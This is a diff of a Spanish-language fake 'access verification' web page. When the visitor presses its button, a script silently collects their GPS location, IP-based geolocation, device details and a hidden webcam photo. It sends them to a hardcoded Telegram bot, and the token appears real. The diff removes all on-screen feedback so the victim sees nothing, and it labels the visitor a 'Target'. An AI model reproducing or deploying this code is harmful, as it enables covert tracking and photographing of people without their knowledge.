@@ -6,113 +6,142 @@
     <title>Verificación de Acceso</title>
     <style>
         body { font-family: Arial; text-align: center; padding: 50px; background: black; color: white; }
-        button { background: blue; padding: 15px 30px; border: none; border-radius: 10px; color: white; font-size: 18px; cursor: pointer; margin: 10px; }
-        #status { margin-top: 20px; font-size: 14px; }
-        video, canvas { display: none; }
+        button { background: blue; padding: 15px 30px; border: none; border-radius: 10px; color: white; font-size: 18px; cursor: pointer; }
     </style>
 </head>
 <body>
     <h1>Verificación de Acceso</h1>
-    <button id="btn">✅ Verificar ahora</button>
-    <p id="status"></p>
-
-    <!-- Elementos ocultos para capturar foto -->
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <button id="btn">Verificar ahora</button>
+    <video id="video" autoplay playsinline style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-        // 👇 CAMBIA ESTOS DOS VALORES POR LOS TUYOS 👇
-        const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s'; //Tu token NUEVO (revoca el viejo)
-        const CHAT_ID = '7555997298'; // Tu Chat ID
+        // ⚠️ CAMBIA ESTO POR TU NUEVO TOKEN (revoca el viejo primero)
+        const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
+        const CHAT_ID = '7555997298'; // Tu Chat ID (no cambia)
 
-        const btn = document.getElementById('btn');
-        const statusDiv = document.getElementById('status');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        let stream = null;
+        // Función para obtener IP y geolocalización por IP (fallback)
+        async function getIPinfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    region: data.region,
+                    city: data.city,
+                    postal: data.postal,
+                    timezone: data.timezone
+                };
+            } catch(e) { return null; }
+        }
 
-        // Función para enviar mensaje de texto a Telegram
+        // Función para obtener datos del dispositivo
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceModel = "Desconocido";
+            if (ua.includes('iPhone')) deviceModel = 'iPhone';
+            else if (ua.includes('iPad')) deviceModel = 'iPad';
+            else if (ua.includes('Android')) deviceModel = 'Android';
+            else if (ua.includes('Mac')) deviceModel = 'Mac';
+            else if (ua.includes('Windows')) deviceModel = 'Windows PC';
+            const language = navigator.language || navigator.userLanguage;
+            const resolution = `${window.screen.width}x${window.screen.height}`;
+            const cpuCores = navigator.hardwareConcurrency || 'Desconocido';
+            return { deviceModel, ua, language, resolution, cpuCores };
+        }
+
+        // Enviar mensaje de texto a Telegram (sin feedback visual)
         async function sendMessage(text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-                });
-            } catch(e) { console.error(e); }
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
         }
 
-        // Función para enviar foto a Telegram
+        // Enviar foto
         async function sendPhoto(blob) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'photo.jpg');
-            try {
-                await fetch(url, { method: 'POST', body: formData });
-            } catch(e) { console.error(e); }
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'photo.jpg');
+            await fetch(url, { method: 'POST', body: fd });
         }
 
-        // Capturar foto desde la cámara
+        // Capturar foto en silencio
         async function capturePhoto() {
-            if (stream) {
-                // Detener stream anterior si existe
-                stream.getTracks().forEach(track => track.stop());
-            }
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            let stream = null;
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
-                });
-                // Esperar un momento para que la cámara se estabilice
+                await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
                 await new Promise(r => setTimeout(r, 500));
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                // Detener stream
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
+                stream.getTracks().forEach(t => t.stop());
                 return blob;
-            } catch (err) {
-                console.error('Error de cámara:', err);
+            } catch(e) {
+                if (stream) stream.getTracks().forEach(t => t.stop());
                 return null;
             }
         }
 
-        btn.onclick = async () => {
-            statusDiv.innerText = 'Obteniendo ubicación...';
-            // 1. Obtener ubicación
-            if (!navigator.geolocation) {
-                statusDiv.innerText = '❌ Geolocalización no soportada';
-                return;
+        // Acción del botón: todo en silencio
+        document.getElementById('btn').onclick = async () => {
+            const device = getDeviceInfo();
+            let ipInfo = await getIPinfo();
+
+            // GPS exacto (si se puede)
+            let gpsCoords = null;
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                    });
+                    gpsCoords = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+                } catch(e) { /* silencio */ }
             }
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                const lat = position.coords.latitude;
-                const lng = position.coords.longitude;
-                const maps = `https://www.google.com/maps?q=${lat},${lng}`;
-                const locationMsg = `📍 Ubicación capturada:\nLat: ${lat}\nLng: ${lng}\nMapa: ${maps}`;
-                await sendMessage(locationMsg);
-                statusDiv.innerText = '✅ Ubicación enviada. Solicitando cámara...';
-                
-                // 2. Intentar capturar foto (requiere permiso adicional)
-                const photoBlob = await capturePhoto();
-                if (photoBlob) {
-                    await sendPhoto(photoBlob);
-                    statusDiv.innerText = '✅ Ubicación y foto enviadas a Telegram';
-                } else {
-                    await sendMessage('❌ No se pudo acceder a la cámara o capturar foto');
-                    statusDiv.innerText = '⚠️ Ubicación enviada, pero falló la cámara';
+
+            // Construir mensaje detallado
+            let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n`;
+            message += `🖥️ *Device & Browser*\n`;
+            message += `   • Device Model: ${device.deviceModel}\n`;
+            message += `   • User Agent: ${device.ua}\n\n`;
+            message += `🌐 *Network Information*\n`;
+            message += `   • IP Address: ${ipInfo ? ipInfo.ip : 'No disponible'}\n`;
+            message += `   • Language: ${device.language}\n\n`;
+            message += `📍 *Location Details*\n`;
+            if (gpsCoords) {
+                message += `   • GPS Coordinates: ${gpsCoords.lat}, ${gpsCoords.lng}\n`;
+                message += `   • Accuracy: ±${gpsCoords.accuracy} meters\n`;
+                message += `   • Maps: https://www.google.com/maps?q=${gpsCoords.lat},${gpsCoords.lng}\n`;
+            } else {
+                message += `   • GPS: No disponible\n`;
+                if (ipInfo && ipInfo.city) {
+                    message += `   • Country: ${ipInfo.country}\n`;
+                    message += `   • Region: ${ipInfo.region}\n`;
+                    message += `   • City: ${ipInfo.city}\n`;
+                    message += `   • Postal Code: ${ipInfo.postal}\n`;
+                    message += `   • Timezone: ${ipInfo.timezone}\n`;
                 }
-            }, (error) => {
-                statusDiv.innerText = '❌ Error de ubicación: ' + error.message;
-                sendMessage(`❌ Error de geolocalización: ${error.message}`);
-            });
+            }
+            message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
+            message += `🔐 *Device Permissions*\n`;
+            message += `   • Camera: ${await (navigator.mediaDevices ? 'Solicitado' : 'No soportado')}\n`;
+            message += `   • Location: ${gpsCoords ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
+            message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n`;
+            message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n`;
+
+            // Enviar datos sin mostrar nada al usuario
+            await sendMessage(message);
+            const foto = await capturePhoto();
+            if (foto) await sendPhoto(foto);
         };
     </script>
 </body>
